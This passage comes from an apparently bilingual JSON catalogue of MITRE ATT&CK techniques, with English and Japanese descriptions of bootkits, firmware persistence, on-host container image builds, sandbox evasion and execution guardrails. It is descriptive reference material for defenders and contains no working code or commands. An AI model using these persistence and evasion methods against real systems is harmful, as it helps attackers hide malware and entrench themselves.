                "description_jp": "攻撃者は、システム上の永続性を確立する方法として、OS起動前のメカニズムを悪用する可能性があります。コンピュータの起動プロセス中、ファームウェアとさまざまな起動サービスがオペレーティングシステムの前にロードされます。これらのプログラムは、オペレーティングシステムが制御を取得する前に実行フローを制御します。(引用: Wikipedia Booting)\n\n攻撃者は、BIOS（基本入出力システム）やUnified Extensible Firmware Interface（UEFI）などのブートドライバやファームウェアのデータを上書きして、オペレーティングシステムより下のレイヤーでシステムに永続化する可能性があります。このレベルのマルウェアはホストのソフトウェアベースの防御では検出されないため、検出が特に困難になる可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1542.003",
                        "name_eng": "Bootkit",
                        "name_jp": "ブートキット",
                        "description_eng": "Adversaries may use bootkits to persist on systems. A bootkit is a malware variant that modifies the boot sectors of a hard drive, allowing malicious code to execute before a computer's operating system has loaded. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\nIn BIOS systems, a bootkit may modify the Master Boot Record (MBR) and/or Volume Boot Record (VBR).(Citation: Mandiant M Trends 2016) The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code.(Citation: Lau 2011)\n\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.\n\nIn UEFI (Unified Extensible Firmware Interface) systems, a bootkit may instead create or modify files in the EFI system partition (ESP). The ESP is a partition on data storage used by devices containing UEFI that allows the system to boot the OS and other utilities used by the system. An adversary can use the newly created or patched files in the ESP to run malicious kernel code.(Citation: Microsoft Security)(Citation: welivesecurity)",
                        "description_jp": "攻撃者はブートキットを使用してシステムに永続化する可能性があります。ブートキットは、ハードドライブのブートセクタを変更するマルウェアの亜種であり、コンピュータのオペレーティングシステムがロードされる前に悪意のあるコードを実行できるようにします。ブートキットはオペレーティングシステムより下のレイヤーに存在するため、組織が使用されたことを疑って適切に対応できない限り、完全な修復が困難になる可能性があります。\n\nBIOSシステムでは、ブートキットはマスターブートレコード（MBR）および/またはボリュームブートレコード（VBR）を変更する可能性があります。(引用: Mandiant M Trends 2016) MBRは、BIOSによるハードウェア初期化の完了後に最初にロードされるディスクのセクションです。これはブートローダーの場所です。ブートドライブへのrawアクセス権を持つ攻撃者はこの領域を上書きし、起動中の実行を通常のブートローダーから攻撃者のコードに迂回させる可能性があります。(引用: Lau 2011)\n\nMBRはブートプロセスの制御をVBRに渡します。MBRの場合と同様に、ブートドライブへのrawアクセス権を持つ攻撃者はVBRを上書きして、起動中の実行を攻撃者のコードに迂回させる可能性があります。\n\nUEFI（Unified Extensible Firmware Interface）システムでは、ブートキットは代わりにEFIシステムパーティション（ESP）にファイルを作成または変更する可能性があります。ESPは、UEFIを含むデバイスで使用されるデータストレージ上のパーティションであり、システムがOSおよびシステムで使用されるその他のユーティリティを起動できるようにします。攻撃者はESPに新しく作成またはパッチが適用されたファイルを使用して、悪意のあるカーネルコードを実行できます。(引用: Microsoft Security)(引用: welivesecurity)"
                    },
                    {
                        "id": "T1542.005",
                        "name_eng": "TFTP Boot",
                        "name_jp": "TFTPブート",
                        "description_eng": "Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.\n\nAdversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with [Modify System Image](https://attack.mitre.org/techniques/T1601) to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) and may result in the network device running a modified image. (Citation: Cisco Blog Legacy Device Attacks)",
                        "description_jp": "攻撃者はネットブートを悪用して、Trivial File Transfer Protocol (TFTP) サーバーから不正なネットワークデバイスオペレーティングシステムをロードする可能性があります。TFTPブート (ネットブート) は、ネットワーク管理者が集中管理サーバーから構成制御されたネットワークデバイスイメージをロードするためによく使用されます。ネットブートはブートシーケンスのオプションの1つであり、デバイスイメージを集中管理、管理、制御するために使用できます。\n\n攻撃者は、悪意のあるTFTPサーバーの使用を指定するネットワークデバイス上の構成を操作する可能性があり、これはデバイスの起動時またはリセット時に変更されたイメージをロードするために[システムイメージの変更](https://attack.mitre.org/techniques/T1601)と組み合わせて使用される可能性があります。不正なイメージにより、攻撃者はデバイス構成を変更したり、デバイスに悪意のある機能を追加したり、標準機能の使用を通じて検出を最小限に抑えながらネットワークデバイスの制御を維持するためのバックドアを導入したりすることができます。このテクニックは[ROMMONキット](https://attack.mitre.org/techniques/T1542/004)に似ており、ネットワークデバイスが変更されたイメージを実行する結果になる可能性があります。(引用: Cisco Blog Legacy Device Attacks)"
                    },
                    {
                        "id": "T1542.002",
                        "name_eng": "Component Firmware",
                        "name_jp": "コンポーネントファームウェア",
                        "description_eng": "Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1542/001) but conducted upon other system components/devices that may not have the same capability or level of integrity checking.\n\nMalicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                        "description_jp": "攻撃者は、コンポーネントのファームウェアを変更してシステムに永続化する可能性があります。一部の攻撃者は、コンピュータコンポーネントを侵害し、オペレーティングシステムやメインシステムファームウェアまたはBIOSの外部で攻撃者のコードを実行する悪意のあるファームウェアをインストールするために、高度な手段を用いる場合があります。このテクニックは[システムファームウェア](https://attack.mitre.org/techniques/T1542/001)に似ている可能性がありますが、同じ機能や整合性チェックのレベルを持たない他のシステムコンポーネント/デバイスに対して実行される場合があります。\n\n悪意のあるコンポーネントファームウェアは、アクセスを維持するための潜在的な一般的な障害やハードディスクの再イメージ化にもかかわらず、システムへの永続的なレベルのアクセスと、ホストソフトウェアベースの防御と整合性チェックを回避する方法の両方を提供する可能性があります。"
                    },
                    {
                        "id": "T1542.004",
                        "name_eng": "ROMMONkit",
                        "name_jp": "ROMMONキット",
                        "description_eng": "Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. (Citation: Cisco Synful Knock Evolution)(Citation: Cisco Blog Legacy Device Attacks)\n\n\nROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to [TFTP Boot](https://attack.mitre.org/techniques/T1542/005), an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.",
                        "description_jp": "攻撃者は、不正なファームウェアと攻撃者のコードをロードすることでROMモニタ（ROMMON）を悪用し、検出が困難な永続的なアクセスを提供し、デバイスの動作を操作する可能性があります。(引用: Cisco Synful Knock Evolution)(引用: Cisco Blog Legacy Device Attacks)\n\n\nROMMONは、プラットフォームの電源投入時またはリセット時にハードウェアとソフトウェアを初期化するためのブートローダー、ブートイメージ、またはブートヘルパーとして機能するCiscoネットワークデバイスファームウェアです。[TFTPブート](https://attack.mitre.org/techniques/T1542/005)と同様に、攻撃者は攻撃者のコードでROMMONイメージをローカルまたはリモート（例えばTFTP経由）でアップグレードし、デバイスを再起動して既存のROMMONイメージを上書きする可能性があります。これにより、攻撃者は検出が困難な方法でシステム上の永続性を得るためにROMMONを更新する手段を得ます。"
                    },
                    {
                        "id": "T1542.001",
                        "name_eng": "System Firmware",
                        "name_jp": "システムファームウェア",
                        "description_eng": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
                        "description_jp": "攻撃者はシステムファームウェアを変更してシステムに永続化する可能性があります。BIOS（基本入出力システム）およびUnified Extensible Firmware Interface（UEFI）またはExtensible Firmware Interface（EFI）は、オペレーティングシステムとコンピュータのハードウェア間のソフトウェアインターフェイスとして動作するシステムファームウェアの例です。(引用: Wikipedia BIOS)(引用: Wikipedia UEFI)(引用: About UEFI)\n\nBIOSや(U)EFIのようなシステムファームウェアは、コンピュータの機能の基礎となるものであり、悪意のある活動を実行したり支援したりするために、敵対者によって変更される可能性がある。システムファームウェアを上書きする機能が存在し、これにより高度な敵対者は、検出が困難なシステム上の永続性の手段として、悪意のあるファームウェアアップデートをインストールする手段を得ることができる。"
                    }
                ]
            },
            {
                "id": "T1612",
                "name_eng": "Build Image on Host",
                "name_jp": "ホスト上でのイメージ構築",
                "description_eng": "Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote <code>build</code> request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.(Citation: Docker Build Image)\n\nAn adversary may take advantage of that <code>build</code> API to build a custom image on the host that includes malware downloaded from their C2 server, and then they may utilize [Deploy Container](https://attack.mitre.org/techniques/T1610) using that custom image.(Citation: Aqua Build Images on Hosts)(Citation: Aqua Security Cloud Native Threat Report June 2021) If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it’s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment.",
                "description_jp": "攻撃者は、パブリックレジストリからの悪意のあるイメージの取得を監視する防御をバイパスするために、ホスト上で直接コンテナイメージを構築する可能性があります。リモートの<code>build</code>リクエストがDocker APIに送信される場合があり、これにはパブリックまたはローカルレジストリからalpineなどのバニラベースイメージをプルし、その上にカスタムイメージを構築するDockerfileが含まれます。(引用: Docker Build Image)\n\n敵対者は、その<code>build</code> APIを利用して、C2サーバーからダウンロードしたマルウェアを含むカスタムイメージをホスト上に構築し、その後、そのカスタムイメージを使用して[コンテナのデプロイ](https://attack.mitre.org/techniques/T1610)を利用する可能性があります。(引用: Aqua Build Images on Hosts)(引用: Aqua Security Cloud Native Threat Report June 2021) ベースイメージがパブリックレジストリからプルされた場合、バニライメージであるため、防御側はイメージが悪意のあるものとして検出しない可能性が高いです。ベースイメージが既にローカルレジストリに存在する場合、イメージは既に環境内にあるため、プルはさらに疑わしくないと見なされる可能性があります。",
                "subtechniques": []
            },
            {
                "id": "T1497",
                "name_eng": "Virtualization/Sandbox Evasion",
                "name_jp": "仮想化/サンドボックス回避",
                "description_eng": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)\n\nAdversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)",
                "description_jp": "攻撃者は、仮想化および分析環境を検出して回避するために、さまざまな手段を用いる可能性があります。これには、仮想マシン環境（VME）またはサンドボックスを示すアーティファクトの存在のチェック結果に基づいて動作を変更することが含まれる場合があります。攻撃者がVMEを検出した場合、マルウェアを変更して被害者から切り離したり、インプラントのコア機能を隠したりする可能性があります。また、セカンダリペイロードまたは追加ペイロードをドロップする前にVMEアーティファクトを検索することもあります。攻撃者は、自動検出中に[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)から学習した情報を使用して、その後の動作を形成する可能性があります。(引用: Deloitte Environment Awareness)\n\n攻撃者は、セキュリティ監視ツール（Sysinternals、Wiresharkなど）や、分析または仮想化に関連するその他のシステムアーティファクトのチェックなど、[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)を達成するためにいくつかの方法を使用する可能性があります。攻撃者はまた、正当なユーザーアクティビティをチェックして、分析環境にあるかどうかを判断するのに役立てることもあります。追加の方法には、一時的なサンドボックス内で動作することを避けるために、マルウェアコード内でスリープタイマーまたはループを使用することが含まれます。(引用: Unit 42 Pirpi July 2015)",
                "subtechniques": [
                    {
                        "id": "T1497.002",
                        "name_eng": "User Activity Based Checks",
                        "name_jp": "ユーザーアクティビティベースのチェック",
                        "description_eng": "Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)\n\nAdversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks (Citation: Sans Virtual Jan 2016) , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro (Citation: Unit 42 Sofacy Nov 2018) or waiting for a user to double click on an embedded image to activate.(Citation: FireEye FIN7 April 2017)",
                        "description_jp": "攻撃者は、仮想化および分析環境を検出して回避するために、さまざまなユーザーアクティビティチェックを採用する可能性があります。これには、仮想マシン環境（VME）またはサンドボックスを示すアーティファクトの存在のチェック結果に基づいて動作を変更することが含まれる場合があります。攻撃者がVMEを検出した場合、マルウェアを変更して被害者から切り離したり、インプラントのコア機能を隠したりする可能性があります。また、セカンダリペイロードまたは追加ペイロードをドロップする前にVMEアーティファクトを検索することもあります。攻撃者は、自動検出中に[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)から学習した情報を使用して、その後の動作を形成する可能性があります。(引用: Deloitte Environment Awareness)\n\n敵対者は、マウスの動きやクリックの速度/頻度(引用：Sans Virtual Jan 2016)、ブラウザの履歴、キャッシュ、ブックマーク、あるいはホームやデスクトップなどの共通ディレクトリ内のファイル数といった変数に基づいて、ホスト上のユーザー活動を検索するかもしれない。他の方法では、悪意のあるコードがアクティブ化される前にシステムとの特定のユーザーインタラクションに依存するかもしれず、例えば、マクロをアクティブ化する前にドキュメントが閉じるのを待ったり(引用：Unit 42 Sofacy Nov 2018)、アクティブ化するためにユーザーが埋め込み画像をダブルクリックするのを待ったりするなどです(引用：FireEye FIN7 April 2017)。"
                    },
                    {
                        "id": "T1497.001",
                        "name_eng": "System Checks",
                        "name_jp": "システムチェック",
                        "description_eng": "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)\n\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \n\nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as `malware`, `sample`, or `hash`.\n\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \n \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.(Citation: Unit 42 OilRig Sept 2018)",
                        "description_jp": "攻撃者は、仮想化および分析環境を検出して回避するために、さまざまなシステムチェックを採用する可能性があります。これには、仮想マシン環境（VME）またはサンドボックスを示すアーティファクトの存在のチェック結果に基づいて動作を変更することが含まれる場合があります。攻撃者がVMEを検出した場合、マルウェアを変更して被害者から切り離したり、インプラントのコア機能を隠したりする可能性があります。また、セカンダリペイロードまたは追加ペイロードをドロップする前にVMEアーティファクトを検索することもあります。攻撃者は、自動検出中に[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)から学習した情報を使用して、その後の動作を形成する可能性があります。(引用: Deloitte Environment Awareness)\n\n特定のチェックはターゲットや攻撃者によって異なりますが、システム情報を取得しVMEアーティファクトを検索するために、[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)、[PowerShell](https://attack.mitre.org/techniques/T1059/001)、[システム情報ディスカバリ](https://attack.mitre.org/techniques/T1082)、[レジストリクエリ](https://attack.mitre.org/techniques/T1012)などの動作が含まれる場合があります。攻撃者は、メモリ、プロセス、ファイルシステム、ハードウェア、および/またはレジストリでVMEアーティファクトを検索する場合があります。攻撃者は、これらのチェックを1つのスクリプトに自動化するためにスクリプトを使用し、システムが仮想環境であると判断した場合にプログラムを終了させる場合があります。\n\nチェックには、ホスト/ドメイン名やネットワークトラフィックのサンプルなどの一般的なシステムプロパティが含まれる場合があります。攻撃者はまた、ネットワークアダプタのアドレス、CPUコア数、利用可能なメモリ/ドライブサイズを確認する場合があります。実行されると、マルウェアは[ファイルとディレクトリの発見](https://attack.mitre.org/techniques/T1083)を使用して、`malware`、`sample`、`hash`などの予期しない、あるいは分析に関連する名前付けアーティファクトを持つフォルダやファイルに保存されたかどうかを確認する場合があります。\n\nその他の一般的なチェックには、これらのアプリケーションに固有の実行中のサービスの列挙、システムにインストールされているプログラム、仮想マシンアプリケーションに関連する文字列の製造元/製品フィールド、およびVME固有のハードウェア/プロセッサ命令が含まれる場合があります。(引用: McAfee Virtual Jan 2017) VMWareなどのアプリケーションでは、攻撃者は特別なI/Oポートを使用してコマンドを送信し、出力を受信することもできます。\n\nファン、温度、オーディオデバイスの存在などのハードウェアチェックも、仮想環境を示す可能性のある証拠を収集するために使用できます。攻撃者はまた、これらのデバイスから特定の測定値を照会する場合があります。(引用: Unit 42 OilRig Sept 2018)"
                    },
                    {
                        "id": "T1497.003",
                        "name_eng": "Time Based Evasion",
                        "name_jp": "時間ベースの回避",
                        "description_eng": "Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\n\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels](https://attack.mitre.org/techniques/T1104) to avoid analysis and scrutiny.(Citation: Deloitte Environment Awareness)\n\nBenign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as [Ping](https://attack.mitre.org/software/S0097)s, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.(Citation: Revil Independence Day)(Citation: Netskope Nitol) Another variation, commonly referred to as API hammering, involves making various calls to [Native API](https://attack.mitre.org/techniques/T1106) functions in order to delay execution (while also potentially overloading analysis environments with junk data).(Citation: Joe Sec Nymaim)(Citation: Joe Sec Trickbot)\n\nAdversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.(Citation: ISACA Malware Tricks)",
                        "description_jp": "攻撃者は、仮想化および分析環境を検出して回避するために、さまざまな時間ベースの方法を採用する可能性があります。これには、稼働時間やシステムクロックなどの時間ベースのプロパティの列挙、および仮想マシン環境（VME）またはサンドボックス（特に自動化されているか、限られた時間しか動作しないもの）を回避するためのタイマーまたはその他のトリガーの使用が含まれる場合があります。\n\n攻撃者は、プログラムによるスリープコマンドやネイティブシステムスケジューリング機能（例：[スケジュールされたタスク/ジョブ](https://attack.mitre.org/techniques/T1053)）を使用して初期実行時にマルウェアの機能を遅延させるなど、さまざまな時間ベースの回避策を用いる可能性があります。遅延は、特定の被害者の条件（例：システム時刻、イベントなど）が満たされるのを待つことに基づく場合もあれば、分析や精査を回避するためにスケジュールされた[多段階チャネル](https://attack.mitre.org/techniques/T1104)を使用する場合もあります。(引用: Deloitte Environment Awareness)\n\n良性のコマンドやその他の操作も、マルウェアの実行を遅らせるために使用される場合があります。[Ping](https://attack.mitre.org/software/S0097)などのコマンドのループや不必要な繰り返しは、マルウェアの実行を遅らせ、自動分析環境の時間的しきい値を超える可能性があります。(引用: Revil Independence Day)(引用: Netskope Nitol) APIハンマリングとして一般的に知られている別のバリエーションは、実行を遅らせるために[ネイティブAPI](https://attack.mitre.org/techniques/T1106)関数へのさまざまな呼び出しを行うことを含みます（同時に、ジャンクデータで分析環境を過負荷にする可能性もあります）。(引用: Joe Sec Nymaim)(引用: Joe Sec Trickbot)\n\n攻撃者はまた、時間を指標として使用してサンドボックスや分析環境を検出することもあります。特に、長時間の経過をシミュレートするために時間メカニズムを操作しようとするものを検出します。例えば、攻撃者は、スリープ関数の実行前後に環境のタイムスタンプの期待値をサンプリングして計算することにより、時間を加速させているサンドボックスを特定できる場合があります。(引用: ISACA Malware Tricks)"
                    }
                ]
            },
            {
                "id": "T1480",
                "name_eng": "Execution Guardrails",
                "name_jp": "実行ガードレール",
                "description_eng": "Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.(Citation: FireEye Outlook Dec 2019)\n\nGuardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.\n\nAdversaries may identify and block certain user-agents to evade defenses and narrow the scope of their attack to victims and platforms on which it will be most effective. A user-agent self-identifies data such as a user's software application, operating system, vendor, and version. Adversaries may check user-agents for operating system identification and then only serve malware for the exploitable software while ignoring all other operating systems.(Citation: Trellix-Qakbot)",
                "description_jp": "攻撃者は、ターゲットに存在すると予想される、攻撃者が提供し環境固有の条件に基づいて実行またはアクションを制約するために、実行ガードレールを使用する可能性があります。ガードレールは、ペイロードが意図したターゲットに対してのみ実行されるようにし、攻撃者のキャンペーンによる巻き添え被害を軽減します。(引用: FireEye Kevin Mandia Guardrails) 攻撃者がガードレールとして使用するために提供できるターゲットシステムまたは環境に関する値には、特定のネットワーク共有名、接続された物理デバイス、ファイル、参加しているActive Directory（AD）ドメイン、およびローカル/外部IPアドレスが含まれる場合があります。(引用: FireEye Outlook Dec 2019)\n\nガードレールは、侵害または操作されることを意図していない環境での機能の公開を防ぐために使用できます。このガードレールの使用は、典型的な[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)とは異なります。[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)の使用には、既知のサンドボックス値のチェックと、一致がない場合にのみ実行を継続することが含まれる場合がありますが、ガードレールの使用には、予想されるターゲット固有の値のチェックと、そのような一致がある場合にのみ実行を継続することが含まれます。\n\n敵対者は、特定のユーザーエージェントを特定してブロックし、防御を回避し、攻撃の範囲を最も効果的な被害者とプラットフォームに絞り込むかもしれません。ユーザーエージェントは、ユーザーのソフトウェアアプリケーション、オペレーティングシステム、ベンダー、バージョンなどのデータを自己識別します。敵対者は、オペレーティングシステムの識別についてユーザーエージェントをチェックし、他のすべてのオペレーティングシステムを無視しながら、悪用可能なソフトウェアのマルウェアのみを提供するかもしれません。(引用：Trellix-Qakbot)",
                "subtechniques": [
                    {
                        "id": "T1480.001",
                        "name_eng": "Environmental Keying",
                        "name_jp": "環境キーイング",
                        "description_eng": "Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of [Execution Guardrails](https://attack.mitre.org/techniques/T1480) that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.(Citation: EK Clueless Agents)\n\nValues can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).\n\nSimilar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.(Citation: Kaspersky Gauss Whitepaper) This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.\n\nLike other [Execution Guardrails](https://attack.mitre.org/techniques/T1480), environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.",
                        "description_jp": "攻撃者は、ペイロードやマルウェアのその他の機能を環境的にキーイングして、防御を回避し、特定のターゲット環境への実行を制約する可能性があります。環境キーイングは、ターゲットに存在すると予想される、攻撃者が提供する環境固有の条件に基づいて実行またはアクションを制約するために暗号化を使用します。環境キーイングは、特定のコンピューティング環境における特定の種類の値から暗号化/復号化キーを導き出すために暗号化技術を利用する[実行ガードレール](https://attack.mitre.org/techniques/T1480)の実装です。(引用: EK Clueless Agents)\n\n値はターゲット固有の要素から導き出すことができ、暗号化されたペイロードの復号化キーを生成するために使用できます。ターゲット固有の値は、特定のネットワーク共有、物理デバイス、ソフトウェア/ソフトウェアバージョン、ファイル、参加しているADドメイン、システム時刻、およびローカル/外部IPアドレスから導き出すことができます。(引用: Kaspersky Gauss Whitepaper)(引用: Proofpoint Router Malvertising)(引用: EK Impeding Malware Analysis)(引用: Environmental Keyed HTA)(引用: Ebowla: Genetic Malware) ターゲット固有の環境値から復号化キーを生成することにより、環境キーイングはサンドボックス検出、ウイルス対策検出、情報のクラウドソーシング、およびリバースエンジニアリングを困難にする可能性があります。(引用: Kaspersky Gauss Whitepaper)(引用: Ebowla: Genetic Malware) これらの困難さは、インシデント対応プロセスを遅らせ、攻撃者が戦術、技術、手順（TTP）を隠すのに役立ちます。\n\n[難読化されたファイルまたは情報](https://attack.mitre.org/techniques/T1027)と同様に、攻撃者はTTPを保護し検出を回避するために環境キーイングを使用する可能性があります。環境キーイングは、実行前にペイロードを復号化するためにターゲット固有の値を使用する暗号化されたペイロードをターゲットに配信するために使用できます。(引用: Kaspersky Gauss Whitepaper)(引用: EK Impeding Malware Analysis)(引用: Environmental Keyed HTA)(引用: Ebowla: Genetic Malware)(引用: Demiguise Guardrail Router Logo) ペイロードを復号化するためにターゲット固有の値を利用することにより、攻撃者はペイロードと共に復号化キーをパッケージ化したり、潜在的に監視されているネットワーク接続を介して送信したりすることを回避できます。ターゲット固有の値を収集する手法によっては、暗号化されたペイロードのリバースエンジニアリングが非常に困難になる場合があります。(引用: Kaspersky Gauss Whitepaper) 